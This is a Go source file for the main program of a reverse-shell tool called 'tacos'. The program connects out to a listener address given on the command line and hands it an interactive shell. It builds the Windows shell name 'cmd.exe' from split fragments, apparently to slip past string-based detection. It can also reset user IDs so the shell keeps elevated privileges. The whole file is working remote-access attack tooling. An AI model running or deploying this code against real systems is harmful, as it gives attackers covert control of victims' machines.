package main

import (
	"flag"
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"

	"github.com/ariary/tacos/pkg/tacos"
)

var (
	Remote  string
	Version = "dev"
)

func main() {
	var detect, setreuid, version bool
	var shell string
	var timeout, maxRetries int
	flag.BoolVar(&detect, "detect", false, "Detect default shell to use it in reverse shell")
	flag.StringVar(&shell, "shell", "/bin/bash", "Shell to use for reverse shell")
	flag.BoolVar(&setreuid, "setreuid", false, "Set the real and effective user IDs to the EUID parameter")
	flag.IntVar(&timeout, "timeout", 10, "Connection timeout in seconds")
	flag.IntVar(&maxRetries, "retry", 0, "Max connection retries (0 = no retry)")
	flag.BoolVar(&version, "version", false, "Print version and exit")
	flag.Parse()

	if version {
		fmt.Printf("tacos %s\n", Version)
		os.Exit(0)
	}

	if runtime.GOOS == "windows" {
		shell = strings.ToLower(fmt.Sprintf("%s%s%s", "Cm", "D.e", "Xe"))
	}

	if detect {
		shell = tacos.DetectDefaultShell()
	}

	if len(flag.Args()) > 0 {
		Remote = flag.Arg(0)
	}

	if Remote == "" {
		fmt.Println("Usage: tacos [options] [listener_url]:[port]")
		fmt.Println("\nOptions:")
		flag.PrintDefaults()
		os.Exit(1)
	}

	if setreuid {
		euid := syscall.Geteuid()
		syscall.Setreuid(euid, euid)
	}

	tacos.ShellReverse(Remote, shell, timeout, maxRetries)
}
